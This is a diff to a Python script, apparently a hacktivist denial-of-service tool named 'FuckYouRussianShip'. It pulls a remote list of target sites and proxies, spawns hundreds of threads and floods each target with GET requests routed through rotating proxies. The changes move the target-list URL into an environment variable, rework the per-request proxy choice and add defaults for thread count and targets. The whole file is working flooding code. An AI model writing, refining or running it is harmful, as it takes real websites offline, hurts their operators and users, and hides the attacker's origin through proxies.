@@ -1,7 +1,7 @@
 # -*- coding: utf-8 -*-
 from argparse import ArgumentParser
 from concurrent.futures import ThreadPoolExecutor, as_completed
-from loguru import logger
+from dotenv import load_dotenv
 from os import system
 from pyuseragents import random as random_useragent
 from random import choice
@@ -18,7 +18,7 @@ import platform
 import requests
 import tableprint
 
-# from pympler.tracker import SummaryTracker
+load_dotenv()  # Take environment variables from .env file.
 
 statistic = {}
 work_statistic = True
@@ -26,17 +26,15 @@ general_statistics = [0, 0]
 threads_count = 0
 thread_count = 0
 
-
 class FuckYouRussianShip:
     HOSTS = []
-    HOSTS_URL = 'https://hutin-puy.nadom.app/hosts.json'
+    HOSTS_URL = os.getenv('ATTACKER_HOSTS_URL')
     MAX_REQUESTS = 5000
 
     def __init__(self):
         disable_warnings()
         self.args = self.parse_arguments()
         self.no_clear = self.args.no_clear
-        self.proxy_view = self.args.proxy_view
         self.targets = self.args.targets
         self.threads = int(self.args.threads)
         self.HOSTS = json.loads(requests.get(self.HOSTS_URL).content)
@@ -44,30 +42,21 @@ class FuckYouRussianShip:
         global work_statistic
         global statistic
 
-        if self.proxy_view:
-            work_statistic = False
-
     @staticmethod
     def clear():
-        if platform.system() == "Linux" or platform.system() == "Darwin":
-            return system('clear')
-        else:
-            return system('cls')
+        command = 'clear' if ['Linux', 'Darwin'].count(platform.system()) else 'cls'
+        return system(command)
 
     @staticmethod
     def parse_arguments():
-        defaults = {
-            'threads': 500 if not os.getenv('ATTACKER_THREADS') else int(os.getenv('ATTACKER_THREADS')),
-            'targets': [] if not os.getenv('ATTACKER_TARGETS') else json.loads(os.getenv('ATTACKER_TARGETS'))
-        }
-
         parser = ArgumentParser()
-        parser.add_argument('threads', nargs='?', default=defaults['threads'])
+        parser.add_argument('threads', nargs='?')
         parser.add_argument("-n", "--no-clear", dest="no_clear", action='store_true')
-        parser.add_argument("-p", "--proxy-view", dest="proxy_view", action='store_true')
-        parser.add_argument("-t", "--targets", dest="targets", nargs='+', default=defaults['targets'])
+        parser.add_argument("-t", "--targets", dest="targets", nargs='+')
         parser.add_argument("-lo", "--logger-output", dest="logger_output")
         parser.add_argument("-lr", "--logger-results", dest="logger_results")
+        parser.set_defaults(threads=int(os.getenv('ATTACKER_THREADS')))
+        parser.set_defaults(targets=json.loads(os.getenv('ATTACKER_TARGETS')))
         parser.set_defaults(no_clear=False)
         parser.set_defaults(proxy_view=False)
         parser.set_defaults(logger_output=stderr)
@@ -98,7 +87,6 @@ class FuckYouRussianShip:
         global threads_count
         threads_count += 1
 
-        # log_file_main = 'main'
         while True:
             scraper = self.init_scraper()
             host = choice(self.HOSTS)
@@ -113,46 +101,21 @@ class FuckYouRussianShip:
                 continue
 
             try:
-                attack = scraper.get(site, timeout=10)
-
-                # writing statistic
+                proxy = choice(data['proxy'])
+                proxy_url = f'{proxy["auth"]}@{proxy["ip"]}' if proxy['auth'] else proxy['ip']
+                attack = scraper.get(site, timeout=10, proxies={
+                    'http': f'http://{proxy_url}',
+                    'https': f'https://{proxy_url}'
+                })
+                # Writing statistic
                 self.write_statistic_success(site, attack.status_code)
-
-                if attack.status_code >= 302:
-                    del attack
-                    for proxy in data['proxy']:
-                        if self.proxy_view:
-                            print('USING PROXY:' + proxy["ip"] + " " + proxy["auth"])
-                        scraper.proxies.update(
-                            {'http': f'{proxy["ip"]}://{proxy["auth"]}', 'https': f'{proxy["ip"]}://{proxy["auth"]}'})
-                        response = scraper.get(site)
-
-                        if 200 <= response.status_code <= 302:
-                            self.write_statistic_success(site, response.status_code)
-                            for _ in range(self.MAX_REQUESTS):
-                                response = scraper.get(site, timeout=10)
-                                self.write_statistic_success(site, response.status_code)
-                                del response
-                        del response
-                else:
-                    for _ in range(self.MAX_REQUESTS):
-                        response = scraper.get(site, timeout=10)
-                        self.write_statistic_success(site, response.status_code)
-                        del response
-            except ConnectionError:
-                self.write_statistic_error(site)
-                continue
-            except Exception:
+                del attack
+            except (ConnectionError, Exception) as e:
                 self.write_statistic_error(site)
                 continue
             finally:
+                del scraper, host, data, site, proxy, proxy_url
                 threads_count -= 1
-                del scraper
-                del host
-                del data
-                del site
-                # del log_file_main
-                # del log_file_name
                 return self.mainth()
 
     @staticmethod
@@ -217,13 +180,16 @@ def attacker_threading(threads_count, worker_func):
 
 
 if __name__ == '__main__':
-    while True:
-        attacker = FuckYouRussianShip()
-        if not attacker.no_clear:
-            attacker.clear()
+    try:
+        while True:
+            attacker = FuckYouRussianShip()
+            if not attacker.no_clear:
+                attacker.clear()
 
-        thread_count = attacker.threads
-        Thread(target=attacker.cleaner, daemon=True).start()
-        Thread(target=attacker.print_statistic, daemon=True).start()
+            thread_count = attacker.threads
+            Thread(target=attacker.cleaner, daemon=True).start()
+            Thread(target=attacker.print_statistic, daemon=True).start()
 
-        attacker_threading(attacker.threads, attacker.mainth)
+            attacker_threading(attacker.threads, attacker.mainth)
+    except KeyboardInterrupt:
+        print(f'Exiting...')
